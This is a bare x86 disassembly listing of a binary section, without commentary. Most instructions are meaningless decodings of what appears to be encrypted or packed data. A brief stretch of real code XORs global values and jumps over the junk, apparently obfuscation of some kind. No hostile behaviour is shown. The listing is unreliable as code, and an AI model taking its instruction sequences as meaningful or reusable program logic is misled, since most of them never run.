  409482:	sub    eax,0x2fcae800
  409487:	sbb    esp,eax
  409489:	cwde   
  40948a:	shr    DWORD PTR [edi-0x43],0x22
  40948e:	pop    ecx
  40948f:	mov    eax,ds:0xc04fad48
  409494:	(bad)  
  409495:	fisub  WORD PTR [ecx+ebp*2-0x1b002a3b]
  40949c:	jb     0x409496
  40949e:	retf   0xbfd8
  4094a1:	push   ebx
  4094a2:	jmp    0xc100dee0
  4094a7:	push   ds
  4094a8:	adc    eax,0x99cd88e4
  4094ad:	aas    
  4094ae:	cwde   
  4094af:	add    DWORD PTR ds:0xe173271,ebx
  4094b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094b6:	in     al,0xf4
  4094b8:	and    DWORD PTR [ebx+0x60],ebx
  4094bb:	imul   ebp,esi,0x49
  4094be:	dec    esi
  4094bf:	scas   al,BYTE PTR es:[edi]
  4094c0:	outs   dx,DWORD PTR ds:[esi]
  4094c1:	(bad)  
  4094c2:	cli    
  4094c3:	into   
  4094c4:	mov    ebp,0xd47bfb6d
  4094c9:	sbb    esp,0xd
  4094cc:	arpl   WORD PTR cs:[edx],bp
  4094cf:	xor    dh,0xc6
  4094d2:	cmp    BYTE PTR [ecx+0x69],ah
  4094d5:	(bad)  
  4094d6:	mov    ah,0xd9
  4094d8:	dec    ebx
  4094d9:	cmp    DWORD PTR [edx-0x438b068d],eax
  4094df:	pop    edx
  4094e0:	push   ds
  4094e1:	pop    ss
  4094e2:	std    
  4094e3:	stc    
  4094e4:	xor    eax,0x6f034069
  4094e9:	xor    BYTE PTR [edx+0x44ce1f50],0x1b
  4094f0:	sbb    al,0xda
  4094f2:	ror    BYTE PTR [eax+edx*1],0xfc
  4094f6:	xlat   BYTE PTR ds:[ebx]
  4094f7:	sub    edi,DWORD PTR [ecx-0x6d]
  4094fa:	int    0xaa
  4094fc:	pop    ecx
  4094fd:	and    edi,ecx
  4094ff:	scas   al,BYTE PTR es:[edi]
  409500:	mov    bl,0x6f
  409502:	push   esp
  409503:	xlat   BYTE PTR ds:[ebx]
  409504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409505:	xor    bh,0x6d
  409508:	or     ch,BYTE PTR [ebp-0x7d]
  40950b:	pusha  
  40950c:	adc    DWORD PTR ds:0xf57ca418,ecx
  409512:	outs   dx,DWORD PTR ds:[esi]
  409513:	and    dh,BYTE PTR [esp+esi*4-0x60455cce]
  40951a:	adc    BYTE PTR [edi-0x4e],ch
  40951d:	cmp    DWORD PTR [eax],eax
  40951f:	call   0x8c00e78d
  409524:	imul   esi,esp,0x41
  409527:	ins    DWORD PTR es:[edi],dx
  409528:	ds inc ecx
  40952a:	jne    0x4094bd
  40952c:	lahf   
  40952d:	dec    eax
  40952e:	das    
  40952f:	daa    
  409530:	enter  0xb318,0x65
  409534:	fwait
  409535:	sti    
  409536:	xchg   ebp,eax
  409537:	push   0x1577002
  40953c:	mov    DWORD PTR [esi+eax*8-0x29],edi
  409540:	mov    al,0xf5
  409542:	int3   
  409543:	test   ebp,ebp
  409545:	inc    ebx
  409546:	xlat   BYTE PTR ds:[ebx]
  409547:	sbb    eax,0x8975f819
  40954c:	fs es push edi
  40954f:	(bad)  
  409550:	sar    DWORD PTR [ebx],cl
  409552:	sub    ah,BYTE PTR [ecx+0x1d6367a9]
  409558:	aas    
  409559:	push   ss
  40955a:	xchg   ebx,eax
  40955b:	xor    DWORD PTR ds:0xafcb115e,esp
  409561:	stc    
  409562:	iret   
  409563:	inc    eax
  409564:	pop    esp
  409565:	ret    
  409566:	and    ecx,DWORD PTR [ebp+0x29]
  409569:	ins    DWORD PTR es:[edi],dx
  40956a:	sub    eax,0x7fce723b
  40956f:	pop    eax
  409571:	fwait
  409572:	push   ebx
  409573:	fdivr  st(5),st
  409575:	stos   BYTE PTR es:[edi],al
  409576:	pop    eax
  409577:	sbb    eax,0xe2ebda3b
  40957c:	push   ecx
  40957d:	sahf   
  40957e:	jp     0x4095ad
  409580:	dec    ebp
  409581:	inc    ecx
  409582:	push   ebp
  409583:	ficomp DWORD PTR [ebx]
  409585:	cmp    DWORD PTR [ebp+0x9de331e],0xf9c3d3cd
  40958f:	dec    edi
  409590:	sbb    al,0x7e
  409592:	sbb    eax,0xa9f1ba00
  409597:	sub    eax,0xedfd6b60
  40959c:	sub    ebx,DWORD PTR [ebx+0x7455461d]
  4095a2:	jle    0x409582
  4095a4:	xor    bl,bh
  4095a6:	xor    dh,al
  4095a8:	pusha  
  4095a9:	pusha  
  4095aa:	ror    DWORD PTR [edi+0xc],1
  4095ad:	mov    ?,WORD PTR [eax-0xbbc1d4b]
  4095b3:	into   
  4095b4:	mov    eax,esi
  4095b6:	push   esi
  4095b7:	pushf  
  4095b8:	cld    
  4095b9:	sbb    edi,edi
  4095bb:	pop    ebp
  4095bc:	mov    edx,0xc4c2b0b2
  4095c1:	xor    ch,ch
  4095c3:	sub    dh,cl
  4095c5:	loop   0x40962b
  4095c7:	pop    esp
  4095c8:	lahf   
  4095c9:	push   edx
  4095ca:	cdq    
  4095cb:	ret    
  4095cc:	sub    BYTE PTR [edx],al
  4095ce:	jo     0x40955a
  4095d0:	loop   0x4095d2
  4095d2:	add    edi,DWORD PTR [edi]
  4095d4:	shr    edx,cl
  4095d6:	inc    eax
  4095d7:	lea    esp,[ebx-0x11]
  4095da:	test   BYTE PTR [esi],al
  4095dc:	mov    BYTE PTR [edx+0x2d2858f0],ah
  4095e2:	xchg   edi,eax
  4095e3:	repz or eax,DWORD PTR [ecx+0x43]
  4095e7:	pop    esp
  4095e8:	lea    ecx,ds:0xffd520e8
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e47:0x7138674e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	add    esi,ecx
  40960e:	test   esi,esp
  409610:	and    BYTE PTR [ebp+0xb],al
  409613:	inc    ebx
  409614:	mov    esp,0xefe9490d
  409619:	pop    esp
  40961a:	cli    
  40961b:	inc    edx
  40961c:	clc    
  40961d:	aas    
  40961e:	mov    al,ds:0xc8eb91b6
  409623:	or     al,0x69
  409625:	add    BYTE PTR [ebx-0x1459425f],al
  40962b:	arpl   WORD PTR [ecx+0x65],sp
  40962e:	adc    esi,DWORD PTR [edi+0x10]
  409631:	sub    bh,BYTE PTR [eax+0x330ced73]
  409637:	pop    ebp
  409638:	ror    BYTE PTR [ebx-0x15],1
  40963b:	pop    edx
  40963c:	in     al,dx
  40963d:	icebp  
  40963e:	sub    BYTE PTR [edi+0x6f],ah
  409641:	pop    edx
  409642:	dec    esp
  409643:	int    0x9e
  409645:	pusha  
  409646:	(bad)  
  409647:	fisttp QWORD PTR [ecx]
  409649:	es ja  0x4096cb
  40964c:	mov    esi,DWORD PTR [ebx]
  40964e:	icebp  
  40964f:	or     ch,BYTE PTR ds:[esi+0x2a]
  409653:	shl    cl,cl
  409655:	dec    esp
  409656:	mov    edx,ss
  409658:	enter  0x37f8,0x79
  40965c:	mov    cl,0x8d
  40965e:	sbb    cl,0x50
  409661:	cmp    eax,0x1bdac0f7
  409666:	bound  esp,QWORD PTR [ebp+0x40]
  409669:	in     al,dx
  40966a:	pop    ebp
  40966b:	ins    BYTE PTR es:[edi],dx
  40966c:	repnz mov edx,edi
  40966f:	push   esi
  409670:	jecxz  0x4096dd
  409672:	out    dx,eax
  409673:	sub    edi,DWORD PTR [ebx+0x11]
  409676:	jbe    0x40968b
  409678:	ror    ebp,0x7a
  40967b:	mov    ds:0xf880ada7,al
  409680:	xchg   ebx,eax
  409681:	xchg   BYTE PTR [esp+edx*8-0xa4b8091],ch
  409688:	xor    esp,DWORD PTR [edi+0x32]
  40968b:	pop    edi
  40968c:	sar    DWORD PTR [edi+0x77],cl
  40968f:	jmp    0xa74a:0xeed965cc
  409696:	dec    esi
  409697:	cli    
  409698:	ret    0xe5d7
  40969b:	cmp    ah,bh
  40969d:	cmp    bh,BYTE PTR [ebx+0x51]
  4096a0:	xchg   ecx,eax
  4096a1:	jnp    0x4096fd
  4096a3:	mov    eax,0xf33b43ff
  4096a8:	shl    BYTE PTR [ebx-0x6d],1
  4096ab:	aad    0x81
  4096ad:	test   BYTE PTR [edi-0x25],al
  4096b0:	and    DWORD PTR [ebp-0x1],0xc426f733
  4096b7:	(bad)  
  4096ba:	lahf   
  4096bb:	jbe    0x4096ec
  4096bd:	aaa    
  4096be:	aaa    
  4096bf:	daa    
  4096c0:	add    ah,BYTE PTR [ebp+0x364231f]
  4096c6:	dec    edi
  4096c7:	sahf   
  4096c8:	sub    BYTE PTR [eax-0x57],0x69
  4096cc:	add    esp,esp
  4096ce:	pop    ebx
  4096cf:	out    dx,al
  4096d0:	push   esp
  4096d1:	push   esp
  4096d2:	sub    edx,ebp
  4096d4:	inc    edx
  4096d5:	cli    
  4096d6:	sub    eax,0x3167bb9d
  4096db:	pop    ss
  4096dc:	sub    al,0x17
  4096de:	or     ch,dh
  4096e0:	pop    esi
  4096e1:	or     BYTE PTR [edx],ah
  4096e3:	nop
  4096e4:	stc    
  4096e5:	inc    esi
  4096e6:	shl    DWORD PTR [eax-0xe],cl
  4096e9:	jp     0x409688
  4096eb:	into   
  4096ec:	mov    al,ds:0x45349f49
  4096f1:	outs   dx,DWORD PTR ds:[esi]
  4096f2:	cs pop ss
  4096f4:	cdq    
  4096f5:	mov    eax,0x6d6d7d43
  4096fa:	or     ecx,DWORD PTR [esi]
  4096fc:	mov    cl,0x7b
  4096fe:	fs out 0xb2,eax
  409701:	pushf  
  409702:	cwde   
  409703:	aaa    
  409704:	mov    edx,DWORD PTR es:[edx-0x52]
  409708:	push   ss
  409709:	inc    ebx
  40970a:	mov    ebx,0xef143822
  40970f:	ss enter 0x263b,0x41
  409714:	xchg   esi,eax
  409715:	add    BYTE PTR [edx+0x26d0d49a],ch
  40971b:	icebp  
  40971c:	cmc    
  40971d:	stc    
  40971e:	mov    eax,ds:0x32485dd
  409723:	pushf  
  409724:	aad    0x78
  409726:	rol    DWORD PTR [edx],1
  409728:	xchg   ebx,eax
  409729:	cmp    bh,BYTE PTR [esi-0x71]
  40972c:	retf   
  40972d:	xor    BYTE PTR [esi],0xd4
  409730:	pop    ss
  409731:	icebp  
  409732:	mov    dl,0x33
  409734:	mov    ah,0x79
  409736:	test   al,0xda
  409738:	jne    0x4097a2
  40973a:	or     BYTE PTR [edx+0xd],dh
  40973d:	xor    eax,0x6561e75c
  409742:	push   0x60
  409744:	jp     0x4096fd
  409746:	mov    ebx,0xcd511980
  40974b:	push   ecx
  40974c:	dec    ebp
  40974d:	jns    0x409787
  40974f:	ret    0xec7e
  409752:	popa   
  409753:	pop    ds
  409754:	mov    al,0x9c
  409756:	cmp    dh,bl
  409758:	rcl    BYTE PTR [edx-0x5cb75285],cl
  40975e:	jb     0x4097b4
  409760:	mov    gs,eax
  409762:	gs push eax
  409764:	test   al,0xb
  409766:	fnstenv [edx-0x79db582b]
  40976c:	sar    BYTE PTR [eax-0x49],0x93
  409770:	inc    ebp
  409771:	pop    ss
  409772:	stc    
  409773:	mov    al,ds:0xa6888667
  409778:	or     bh,BYTE PTR [ebx]
  40977a:	cmp    esp,DWORD PTR [ecx]
  40977c:	dec    edx
  40977d:	outs   dx,BYTE PTR ds:[esi]
  40977e:	pop    ecx
  40977f:	shl    edx,cl
  409781:	mov    DWORD PTR [esi],eax
  409783:	fbstp  TBYTE PTR [ebx-0x3]
  409786:	push   edi
  409787:	jnp    0x409769
  409789:	out    0x8,al
  40978b:	pushf  
  40978c:	cmp    al,0xaf
  40978e:	lds    ebx,FWORD PTR [esi+0x32]
  409791:	out    0xb7,al
  409793:	pop    esi
  409794:	pop    sp
  409796:	pushf  
  409797:	daa    
  409798:	and    BYTE PTR [ecx],al
  40979a:	adc    dh,ah
  40979c:	retf   
  40979d:	xlat   BYTE PTR ds:[ebx]
  40979e:	je     0x409805
  4097a0:	lods   eax,DWORD PTR ds:[esi]
  4097a1:	adc    eax,0x9acdb448
  4097a6:	daa    
  4097a7:	cld    
  4097a8:	cwde   
  4097a9:	cmc    
  4097aa:	push   ecx
  4097ab:	dec    esp
  4097ac:	(bad)  
  4097ad:	pop    ecx
  4097ae:	out    0x5a,eax
  4097b0:	sub    ecx,DWORD PTR [ebx+edi*1]
  4097b3:	mov    edx,0xd76002dd
  4097b8:	arpl   sp,di
  4097ba:	aad    0xf3
  4097bc:	add    dh,cl
  4097be:	lock mov cl,0xcf
  4097c1:	push   0x37d51db2
  4097c6:	popf   
  4097c7:	in     eax,0x8e
  4097c9:	inc    edi
  4097ca:	add    edi,ecx
  4097cc:	retf   
  4097cd:	cld    
  4097ce:	push   0x1a
  4097d0:	(bad)  
  4097d1:	ror    ch,1
  4097d3:	xchg   DWORD PTR [edi+0x66],ecx
  4097d6:	(bad)  
  4097d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097d9:	or     al,ah
  4097db:	scas   eax,DWORD PTR es:[edi]
  4097dc:	mov    bl,0x4e
  4097de:	outs   dx,DWORD PTR ds:[esi]
  4097df:	fist   DWORD PTR [eax]
  4097e1:	loopne 0x40980f
  4097e3:	sub    bl,BYTE PTR [edi+0x5e]
  4097e6:	cmp    eax,0xdc568ff0
  4097eb:	pushf  
  4097ec:	enter  0xbbd5,0xa8
  4097f0:	adc    DWORD PTR [ebx+0x4ebb7a48],eax
  4097f6:	cdq    
  4097f7:	cmp    edx,DWORD PTR [edx]
  4097f9:	mov    dh,dl
  4097fb:	in     eax,dx
  4097fc:	push   edx
  4097fd:	popa   
  4097fe:	dec    eax
  4097ff:	fnsave [edi]
  409801:	add    BYTE PTR [esi+eiz*1-0x694a3a21],cl
  409808:	push   ds
  409809:	loop   0x409854
  40980b:	call   0x9d88:0xbdac4259
  409812:	xchg   edx,eax
  409813:	pop    esi
  409814:	das    
  409815:	mov    ecx,0xb656c9f0
  40981a:	xchg   edx,eax
  40981b:	and    eax,0x1734ce53
  409820:	dec    dx
  409822:	in     al,0xef
  409824:	(bad)  [ebp+0x542e9ab6]
  40982a:	popa   
  40982b:	iret   
  40982c:	outs   dx,BYTE PTR ds:[esi]
  40982d:	push   0x460682ef
  409832:	and    eax,0x8b9831d3
  409837:	inc    ebp
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43385f
  40986f:	xor    DWORD PTR ds:0x433797,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43385b,0x43382b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4337e7,0x433893
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43377b
  4098a6:	sub    DWORD PTR ds:0x43385f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	cmp    DWORD PTR [esi],0xd9b49b66
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	sbb    ecx,esp
  4098ce:	xor    eax,0x92448b39
  4098d3:	mov    ebx,DWORD PTR [edx]
  4098d5:	sub    eax,0xb0a2441e
  4098da:	dec    esp
  4098db:	or     dh,cl
  4098dd:	pop    ebp
  4098de:	and    eax,0x9e2a1b8d
  4098e3:	push   edx
  4098e4:	pop    ebp
  4098e5:	in     eax,0xb2
  4098e7:	(bad)  
  4098e8:	stc    
  4098e9:	pop    esi
  4098ea:	subps  xmm0,xmm1
  4098ed:	and    dh,al
  4098ef:	jmp    0x708f0b2e
  4098f4:	aas    
  4098f5:	call   0x7ce576a0
  4098fa:	xchg   edx,eax
  4098fb:	(bad)  
  4098fc:	add    al,0x10
  4098fe:	adc    al,0xd6
  409900:	nop
  409901:	pop    es
  409902:	mov    eax,DWORD PTR [edx+0x209c12c6]
  409908:	push   cs
  409909:	inc    ecx
  40990a:	iret   
  40990b:	outs   dx,BYTE PTR ds:[esi]
  40990c:	leave  
  40990d:	ds neg ebp
  409910:	pop    ecx
  409911:	jmp    0x40990e
  409913:	into   
  409914:	sub    BYTE PTR ds:0xf5251850,al
  40991a:	call   0x8c18f200
  40991f:	retf   
  409920:	fwait
  409921:	retf   0xff44
  409924:	xchg   ebx,eax
  409925:	cmp    eax,0xbb21b6fd
  40992a:	(bad)  
  40992b:	fstp   DWORD PTR [ebx]
  40992d:	test   DWORD PTR [ebx],0x3d9d1e7e
  409933:	ficom  WORD PTR [ecx-0x34]
  409936:	mov    esp,DWORD PTR [esi]
  409938:	push   0x80815948
  40993d:	jns    0x409976
  40993f:	aam    0x71
  409941:	ins    BYTE PTR es:[edi],dx
  409942:	dec    esi
  409943:	inc    edi
  409944:	mov    ecx,0x81a3bb3a
  409949:	jp     0x40995f
  40994b:	add    ah,BYTE PTR ds:0x66c1
  409950:	sbb    ch,BYTE PTR [ebx+0x7d6e610a]
  409956:	aas    
  409957:	arpl   WORD PTR ds:0xfd4bd9bc,bp
  40995d:	add    edi,DWORD PTR ds:0xf400d6c9
  409963:	fisubr DWORD PTR [edi]
  409965:	jnp    0x409914
  409967:	leave  
  409968:	pop    ds
  409969:	(bad)  
  40996a:	fistp  QWORD PTR [eax+0x1b498ac9]
  409970:	ins    DWORD PTR es:[edi],dx
  409971:	andnps xmm5,XMMWORD PTR [esi+0x5b94b90]
  409978:	lods   eax,DWORD PTR ds:[esi]
  409979:	clc    
  40997a:	push   eax
  40997b:	inc    ebx
  40997c:	mov    bh,0xea
  40997e:	pop    ds
  40997f:	mov    ds:0x8cfcc98a,eax
  409984:	ret    
  409985:	in     al,dx
  409986:	icebp  
  409987:	pop    es
  409988:	pop    es
  409989:	dec    edi
  40998a:	les    esp,FWORD PTR [ebx+0x70]
  40998d:	nop
  40998e:	rcl    ebp,0xec
  409991:	stos   BYTE PTR es:[edi],al
  409992:	jns    0x4099f0
  409994:	lds    edx,FWORD PTR [esi-0x69]
  409997:	out    0x20,al
  409999:	(bad)  
  40999a:	loope  0x4099e4
  40999c:	and    BYTE PTR [ecx],cl
  40999e:	stc    
  40999f:	sbb    dl,0x8d
  4099a2:	inc    ebp
  4099a3:	mov    ebx,DWORD PTR [edx-0x40]
  4099a6:	adc    al,0x51
  4099a8:	ret    0xdca4
  4099ab:	stos   DWORD PTR es:[edi],eax
  4099ac:	repnz data16 das 
  4099af:	lds    edi,FWORD PTR [ebx+0x29]
  4099b2:	push   sp
  4099b4:	imul   edx,DWORD PTR [esi-0x40],0x20f8fe72
  4099bb:	pop    ds
  4099bc:	sbb    esp,DWORD PTR [edi-0x52aa1a42]
  4099c2:	inc    esi
  4099c3:	mov    bl,0x8c
  4099c5:	push   esp
  4099c6:	les    edi,FWORD PTR cs:[edi-0x58]
  4099ca:	mov    ebp,0x78fd70e8
  4099cf:	mov    dh,0x65
  4099d1:	das    
  4099d2:	or     eax,0x18151d12
  4099d7:	popf   
  4099d8:	xchg   DWORD PTR [ebx-0x31414b37],esi
  4099de:	dec    edi
  4099df:	scas   eax,DWORD PTR es:[edi]
  4099e0:	mov    eax,DWORD PTR [ecx]
  4099e2:	ds aam 0x6d
  4099e5:	in     al,0xe8
  4099e7:	ins    DWORD PTR es:[edi],dx
  4099e8:	mov    WORD PTR [edi+0x6],fs
  4099eb:	neg    ah
  4099ed:	jns    0x409984
  4099ef:	out    0x5b,al
  4099f1:	repnz dec ebx
  4099f3:	es out 0xae,eax
  4099f6:	xchg   ebx,eax
  4099f7:	test   al,0x7a
  4099f9:	adc    ebp,DWORD PTR [ebp-0x6f]
  4099fc:	sti    
  4099fd:	xor    BYTE PTR [ecx-0x1269fa24],bh
  409a03:	rcl    BYTE PTR [eax+edi*4-0x77b873a2],cl
  409a0a:	imul   esi,esi,0xb3b48af8
  409a10:	add    ecx,eax
  409a12:	sbb    BYTE PTR [ebp-0x1d],cl
  409a15:	ficom  WORD PTR [edi]
  409a17:	mov    edi,0xd0b7459b
  409a1c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409a1e:	out    0x49,al
  409a20:	xchg   ch,dh
  409a22:	fcom   st(7)
  409a24:	add    DWORD PTR [esi+0x3c],edx
  409a27:	outs   dx,BYTE PTR ds:[esi]
  409a28:	xor    dh,ah
  409a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a2b:	adc    dh,0xb3
  409a2e:	push   0xffffff91
  409a30:	xor    DWORD PTR [eax-0x19],esp
  409a33:	and    BYTE PTR [esp+ecx*4],0x41
  409a37:	es jge 0x4099f3
  409a3a:	stc    
  409a3b:	outs   dx,DWORD PTR ds:[esi]
  409a3c:	daa    
  409a3d:	repz fild WORD PTR [esi+0x70771a30]
  409a44:	mov    ebx,0x591f2e85
  409a49:	imul   eax,DWORD PTR [esi],0x28
  409a4c:	jecxz  0x409a29
  409a4e:	inc    edi
  409a4f:	addr16 pushf 
  409a51:	add    DWORD PTR [esi-0x77],0x6fcc5310
  409a58:	aaa    
  409a59:	shl    DWORD PTR [ebx-0x63],0xbd
  409a5d:	fdivr  DWORD PTR [edx-0x10]
  409a60:	out    dx,eax
  409a61:	aas    
  409a62:	cli    
  409a63:	sub    bl,BYTE PTR [bx+di-0x79]
  409a67:	dec    ebx
  409a68:	or     al,0x37
  409a6a:	push   ebx
  409a6b:	lahf   
  409a6c:	adc    DWORD PTR [ecx+0x6d],ecx
  409a6f:	dec    ebp
  409a70:	aaa    
  409a71:	enter  0xbb37,0xea
  409a75:	shr    bh,0x5b
  409a78:	fsubr  QWORD PTR [ebx-0x7e86eb1d]
  409a7e:	pop    esp
  409a7f:	mov    ebp,0x6d8f9b97
  409a84:	hlt    
  409a85:	aas    
  409a86:	loop   0x409a13
  409a88:	fxch   st(5)
  409a8a:	xchg   ebp,ebx
  409a8c:	pushf  
  409a8d:	sar    ebx,1
  409a8f:	add    eax,0x95a97c04
  409a94:	xchg   ebp,eax
  409a95:	inc    esp
  409a96:	ins    BYTE PTR es:[edi],dx
  409a97:	ret    0x940a
  409a9a:	sub    dl,dl
  409a9c:	std    
  409a9d:	pop    ebp
  409a9e:	push   0x6d
  409aa0:	push   eax
  409aa1:	stc    
  409aa2:	push   ecx
  409aa3:	test   al,0xb2
  409aa5:	loop   0x409aa8
  409aa7:	pop    ebp
  409aa8:	jno    0x409a65
  409aaa:	mov    bl,0xc1
  409aac:	mov    ebx,DWORD PTR [ebx-0x34c67b35]
  409ab2:	push   0x554d797d
  409ab7:	popf   
  409ab8:	cmp    BYTE PTR [edi-0x372b88ba],0x2b
  409abf:	add    bl,bh
  409ac1:	dec    ecx
  409ac2:	inc    edx
  409ac3:	mov    ds:0xd468f714,eax
  409ac8:	loope  0x409a69
  409aca:	inc    eax
  409acb:	int    0x70
  409acd:	adc    bl,0xf3
  409ad0:	stc    
  409ad1:	mov    esi,0x884e3c64
  409ad6:	xlat   BYTE PTR ds:[ebx]
  409ad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad8:	jp     0x409a68
  409ada:	mov    ch,dh
  409adc:	mov    ds:0xc471562c,al
  409ae1:	xlat   BYTE PTR ds:[ebx]
  409ae2:	pop    ecx
  409ae3:	push   ss
  409ae4:	mov    al,ds:0xda8d2166
  409ae9:	and    edx,ebx
  409aeb:	in     eax,dx
  409aec:	mov    al,BYTE PTR [ebp+0x15b9dd70]
  409af2:	rol    ebp,0x2b
  409af5:	pop    ds
  409af6:	add    BYTE PTR [ecx],ah
  409af8:	imul   ebx,DWORD PTR [ebx-0x10],0xa
  409afc:	arpl   WORD PTR fs:[edi],di
  409aff:	jecxz  0x409b01
  409b01:	ffreep st(0)
  409b03:	or     BYTE PTR [esi+0x51],0xde
  409b07:	sub    al,0x91
  409b09:	mov    DWORD PTR [ecx+edi*4-0x2a],eax
  409b0d:	mov    edx,0x35a82ac4
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43381f,0x4337d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x4bd9562c]
  409b32:	sar    DWORD PTR [esi-0x1c],cl
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	in     al,0x86
  409b3d:	xchg   ecx,eax
  409b3e:	shl    dl,1
  409b40:	mov    ds,ebp
  409b42:	test   eax,0x87b34d4c
  409b47:	iret   
  409b48:	rol    BYTE PTR [ebx-0x33c73356],1
  409b4e:	add    BYTE PTR [edx+0x29cf152e],dh
  409b54:	cmp    DWORD PTR [edx],0x1e
  409b57:	pop    edx
  409b58:	xchg   DWORD PTR [esi],ebx
  409b5a:	xor    eax,0xa138ece0
  409b5f:	or     BYTE PTR [ecx-0x65],dh
  409b62:	sbb    ch,BYTE PTR [eax-0x2d]
  409b65:	add    ebp,esi
  409b67:	shr    DWORD PTR [ecx+0x39],cl
  409b6a:	in     eax,dx
  409b6b:	mov    ecx,0xad939d99
  409b70:	iret   
  409b71:	dec    DWORD PTR [esi+0x7f74ff9a]
  409b77:	pop    edi
  409b78:	add    esi,ebp
  409b7a:	repz out dx,eax
  409b7c:	dec    esi
  409b7d:	int    0xa0
  409b7f:	jmp    0xe990:0x34cc59
  409b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b87:	sbb    al,0x94
  409b89:	jns    0x409bd4
  409b8b:	in     eax,dx
  409b8c:	psrad  mm1,QWORD PTR [edi]
  409b8f:	fisubr WORD PTR [edi-0x3d]
  409b92:	outs   dx,BYTE PTR ds:[esi]
  409b93:	cmp    ebx,eax
  409b95:	xor    BYTE PTR [esi-0x2b46ea72],cl
  409b9b:	cmp    BYTE PTR [esi+edi*1-0x62],0xca
  409ba0:	call   0x9e3584dd
  409ba5:	push   0xbcd55037
  409baa:	and    DWORD PTR ds:0xb2b59087,0xfffffff4
  409bb1:	jp     0x409bd8
  409bb3:	pop    edi
  409bb4:	sbb    ecx,DWORD PTR [eax]
  409bb6:	mov    ds:0x63a2927d,eax
  409bbb:	and    BYTE PTR [ebx],al
  409bbd:	out    dx,al
  409bbe:	js     0x409c3a
  409bc0:	mov    ds:0x8061fd95,eax
  409bc5:	adc    edi,0x2bac93cc
  409bcb:	nop
  409bcc:	pop    ss
  409bcd:	sub    al,bh
  409bcf:	scas   al,BYTE PTR es:[edi]
  409bd0:	pop    ebx
  409bd1:	xchg   ebx,eax
  409bd2:	call   0xe3054a2e
  409bd7:	and    esi,edx
  409bd9:	inc    esi
  409bda:	in     al,0x13
  409bdc:	push   ebp
  409bdd:	mov    edx,0xeb3e95ee
  409be2:	data16 (bad) 
  409be4:	int    0x12
  409be6:	push   ds
  409be7:	sub    ecx,DWORD PTR [esi+0x64e104b0]
  409bed:	stos   BYTE PTR es:[edi],al
  409bee:	push   edi
  409bef:	add    dh,dh
  409bf1:	xchg   esp,eax
  409bf2:	loop   0x409b9b
  409bf4:	mov    dl,0x5e
  409bf6:	into   
  409bf7:	call   0x4cf5:0x9b82a978
  409bfe:	loope  0x409c3b
  409c00:	rol    BYTE PTR [ecx],0x3a
  409c03:	mov    cs,ebx
  409c05:	test   al,0x6e
  409c07:	push   ds
  409c08:	stos   BYTE PTR es:[edi],al
  409c09:	cmp    ah,BYTE PTR [ebx]
  409c0b:	popa   
  409c0c:	cs sub al,ah
  409c0f:	inc    esi
  409c10:	pop    esp
  409c11:	(bad)  
  409c12:	mov    bh,0x60
  409c14:	pop    ebx
  409c15:	xchg   ebx,eax
  409c16:	aam    0xcc
  409c18:	minps  xmm2,XMMWORD PTR [ebp-0x13]
  409c1c:	stos   BYTE PTR es:[edi],al
  409c1d:	cwde   
  409c1e:	push   ss
  409c1f:	add    DWORD PTR [ebp+0x7c],esi
  409c22:	mov    BYTE PTR [ebp+ebp*1+0x5e26e520],bh
  409c29:	scas   eax,DWORD PTR es:[edi]
  409c2a:	pop    edi
  409c2b:	sub    al,0xe4
  409c2d:	(bad)  
  409c2e:	in     eax,dx
  409c2f:	int    0xff
  409c31:	or     DWORD PTR [ebx+ebp*2-0x68],esp
  409c35:	mov    ds:0x5808c32e,eax
  409c3a:	lods   eax,DWORD PTR ds:[esi]
  409c3b:	out    0x6c,al
  409c3d:	xchg   esp,eax
  409c3e:	cmp    al,0x99
  409c40:	outs   dx,DWORD PTR ds:[esi]
  409c41:	aad    0xb1
  409c43:	add    DWORD PTR [esi],ebp
  409c45:	in     al,0x47
  409c47:	leave  
  409c48:	lods   eax,DWORD PTR ds:[esi]
  409c49:	out    dx,al
  409c4a:	sub    bh,dl
  409c4c:	loope  0x409c5e
  409c4e:	push   eax
